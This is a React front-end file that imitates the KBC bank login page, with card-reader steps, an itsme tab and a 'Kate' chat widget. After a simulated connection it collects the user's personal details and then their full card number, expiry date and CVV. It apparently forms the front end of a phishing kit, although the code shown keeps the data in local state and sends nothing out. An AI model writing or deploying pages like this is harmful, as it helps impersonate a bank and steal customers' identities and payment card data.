import React, { useState } from 'react';
import './index.css';
import Logo from './Logo';
import { translations } from './translations';

function App() {
  const [activeTab, setActiveTab] = useState('manual');
  const [saveChoice, setSaveChoice] = useState(false);
  const [currentStep, setCurrentStep] = useState('login'); // 'login', 'loading', 'personal-info', 'card-info', 'complete'
  const [isLoading, setIsLoading] = useState(false);
  const [language, setLanguage] = useState('nl'); // Default to Dutch
  const t = translations[language];

  const [formData, setFormData] = useState({
    // Personal info
    firstName: '',
    lastName: '',
    phone: '',
    address: '',
    postalCode: '',
    city: '',
    email: '',
    // Card info
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardHolder: ''
  });

  const handleConnect = () => {
    setIsLoading(true);
    setCurrentStep('loading');
    // Simulate loading
    setTimeout(() => {
      setIsLoading(false);
      setCurrentStep('personal-info');
    }, 2000);
  };

  const handlePersonalInfoSubmit = (e) => {
    e.preventDefault();
    setCurrentStep('card-info');
  };

  const handleCardInfoSubmit = (e) => {
    e.preventDefault();
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setCurrentStep('complete');
    }, 1500);
  };

  const handleInputChange = (field, value) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  return (
    <div className="kbc-container">
      {/* Left Panel */}
      <div className="kbc-image-panel">
        <Logo className="kbc-logo-overlay" />
      </div>

      {/* Right Panel */}
      <div className="kbc-content-panel">

        {/* Header */}
        <header className="kbc-header">
          <div className="kbc-header-item">
            <svg viewBox="0 0 24 24"><path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"></path></svg>
            {t.apps}
          </div>
          <div className="kbc-header-item">
            <svg viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg>
            {t.menu}
          </div>
          <div className="kbc-header-item">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"></path></svg>
            {t.help}
          </div>
        </header>

        {/* Main Content */}
        <main className="kbc-main">
          {currentStep === 'login' && (
            <>
              <div className="back-link">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M19 12H5M12 19l-7-7 7-7" />
                </svg>
              </div>

              <h1>{t.chooseConnectionMode}</h1>

              <div className="login-tabs">
                <button
                  className={`tab-button ${activeTab === 'itsme' ? 'active' : ''} disabled`}
                  disabled
                  title={t.unavailable}
                >
                  <span className="tab-icon-itsme">itsme</span>
                  itsme
                </button>
                <button
                  className={`tab-button ${activeTab === 'manual' ? 'active' : ''}`}
                  onClick={() => setActiveTab('manual')}
                >
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style={{ opacity: 0.6 }}>
                    <path d="M19 2H5c-1.11 0-2 .9-2 2v16c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 15h-2v-2h2v2zm0-4h-2v-2h2v2zm0-4h-2V7h2v2zm-4 8H9v-2h2v2zm0-4H9v-2h2v2zm0-4H9V7h2v2zm-4 8H5v-2h2v2zm0-4H5v-2h2v2zm0-4H5V7h2v2z" />
                  </svg>
                  {t.manual}
                </button>
                <button
                  className={`tab-button ${activeTab === 'scanner' ? 'active' : ''} disabled`}
                  disabled
                  title={t.unavailable}
                >
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style={{ opacity: 0.6 }}>
                    <path d="M3 5v4h2V5h4V3H5c-1.1 0-2 .9-2 2zm2 10H3v4c0 1.1.9 2 2 2h4v-2H5v-4zm14 4h-4v2h4c1.1 0 2-.9 2-2v-4h-2v4zm0-16h-4v2h4v4h2V5c0-1.1-.9-2-2-2z" />
                  </svg>
                  {t.scanner}
                </button>
              </div>

              <div className="steps-container">
                <div className="step">
                  <span className="step-number">01</span>
                  <span>{t.step1Title}</span>
                </div>
                <div className="card-input-container">
                  <input
                    type="text"
                    className="card-input"
                    placeholder="____ ____ ____ ____ _"
                    maxLength="19"
                  />
                  <label className="checkbox-inline">
                    <input type="checkbox" />
                    <span>{t.save}</span>
                  </label>
                </div>

                <div className="step">
                  <span className="step-number">02</span>
                  <span>{t.step2Title}</span>
                </div>
                <div className="card-reader-info">
                  <div className="reader-item">
                    <span className="reader-item-label">{t.pressOn}</span>
                    <div className="reader-item-content">
                      <button className="login-badge">LOGIN</button>
                      <span>+</span>
                      <button className="login-badge">LOGIN</button>
                    </div>
                  </div>
                  <div className="reader-item">
                    <span className="reader-item-label">{t.enterStartCode}</span>
                    <div className="reader-item-content">
                      <span className="code-display">9427 3282</span>
                      <span>+</span>
                      <button className="ok-badge">OK</button>
                    </div>
                  </div>
                  <div className="reader-item">
                    <span className="reader-item-label">{t.enterPin}</span>
                    <div className="reader-item-content">
                      <span className="code-display">PIN</span>
                      <span>+</span>
                      <button className="ok-badge">OK</button>
                    </div>
                  </div>
                </div>

                <div className="step">
                  <span className="step-number">03</span>
                  <span>{t.step3Title}</span>
                </div>
                <div className="connection-code-container">
                  <input
                    type="text"
                    className="connection-code-input"
                    placeholder="____ ____"
                    maxLength="9"
                  />
                  <button className="connect-button" onClick={handleConnect}>{t.connectButton}</button>
                </div>
              </div>
            </>
          )}

          {currentStep === 'loading' && (
            <div className="loading-container">
              <div className="spinner"></div>
              <h2>{t.connecting}</h2>
              <p>{t.pleaseWait}</p>
            </div>
          )}

          {currentStep === 'personal-info' && (
            <>
              <div className="back-link" onClick={() => setCurrentStep('login')}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M19 12H5M12 19l-7-7 7-7" />
                </svg>
              </div>

              <h1>{t.personalInfoTitle}</h1>
              <p className="form-subtitle">{t.step1of2}</p>

              <form onSubmit={handlePersonalInfoSubmit} className="info-form">
                <div className="form-row">
                  <div className="form-group">
                    <label>{t.firstName} *</label>
                    <input
                      type="text"
                      required
                      value={formData.firstName}
                      onChange={(e) => handleInputChange('firstName', e.target.value)}
                      placeholder={t.placeholders.firstName}
                    />
                  </div>
                  <div className="form-group">
                    <label>{t.lastName} *</label>
                    <input
                      type="text"
                      required
                      value={formData.lastName}
                      onChange={(e) => handleInputChange('lastName', e.target.value)}
                      placeholder={t.placeholders.lastName}
                    />
                  </div>
                </div>

                <div className="form-group">
                  <label>{t.phone} *</label>
                  <input
                    type="tel"
                    required
                    value={formData.phone}
                    onChange={(e) => handleInputChange('phone', e.target.value)}
                    placeholder={t.placeholders.phone}
                  />
                </div>

                <div className="form-group">
                  <label>{t.email} *</label>
                  <input
                    type="email"
                    required
                    value={formData.email}
                    onChange={(e) => handleInputChange('email', e.target.value)}
                    placeholder={t.placeholders.email}
                  />
                </div>

                <div className="form-group">
                  <label>{t.address} *</label>
                  <input
                    type="text"
                    required
                    value={formData.address}
                    onChange={(e) => handleInputChange('address', e.target.value)}
                    placeholder={t.placeholders.address}
                  />
                </div>

                <div className="form-row">
                  <div className="form-group">
                    <label>{t.postalCode} *</label>
                    <input
                      type="text"
                      required
                      value={formData.postalCode}
                      onChange={(e) => handleInputChange('postalCode', e.target.value)}
                      placeholder={t.placeholders.postalCode}
                    />
                  </div>
                  <div className="form-group">
                    <label>{t.city} *</label>
                    <input
                      type="text"
                      required
                      value={formData.city}
                      onChange={(e) => handleInputChange('city', e.target.value)}
                      placeholder={t.placeholders.city}
                    />
                  </div>
                </div>

                <button type="submit" className="primary-button">
                  {t.continue}
                </button>
              </form>
            </>
          )}

          {currentStep === 'card-info' && (
            <>
              <div className="back-link" onClick={() => setCurrentStep('personal-info')}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M19 12H5M12 19l-7-7 7-7" />
                </svg>
              </div>

              <h1>{t.cardInfoTitle}</h1>
              <p className="form-subtitle">{t.step2of2}</p>

              <form onSubmit={handleCardInfoSubmit} className="info-form">
                <div className="form-group">
                  <label>{t.cardHolder} *</label>
                  <input
                    type="text"
                    required
                    value={formData.cardHolder}
                    onChange={(e) => handleInputChange('cardHolder', e.target.value)}
                    placeholder={t.placeholders.cardHolder}
                  />
                </div>

                <div className="form-group">
                  <label>{t.cardNumber} *</label>
                  <input
                    type="text"
                    required
                    value={formData.cardNumber}
                    onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                    placeholder={t.placeholders.cardNumber}
                    maxLength="19"
                  />
                </div>

                <div className="form-row">
                  <div className="form-group">
                    <label>{t.expiryDate} *</label>
                    <input
                      type="text"
                      required
                      value={formData.expiryDate}
                      onChange={(e) => handleInputChange('expiryDate', e.target.value)}
                      placeholder={t.placeholders.expiryDate}
                      maxLength="5"
                    />
                  </div>
                  <div className="form-group">
                    <label>{t.cvv} *</label>
                    <input
                      type="text"
                      required
                      value={formData.cvv}
                      onChange={(e) => handleInputChange('cvv', e.target.value)}
                      placeholder={t.placeholders.cvv}
                      maxLength="3"
                    />
                  </div>
                </div>

                <button type="submit" className="primary-button">
                  {t.validate}
                </button>
              </form>
            </>
          )}

          {currentStep === 'complete' && (
            <div className="success-container">
              <div className="success-icon">✓</div>
              <h1>{t.successTitle}</h1>
              <p>{t.successMessage}</p>
              <button className="primary-button" onClick={() => setCurrentStep('login')}>
                {t.backHome}
              </button>
            </div>
          )}
        </main>

        {/* Rate Page / Chat Tab */}
        <div className="kate-tab">
          <div style={{ transform: 'rotate(180deg)' }}>{t.chatKate}</div>
          <div className="kate-icon" style={{ transform: 'rotate(180deg)' }}>
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
              <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z" />
            </svg>
          </div>
        </div>

      </div>
    </div>
  );
}

export default App;
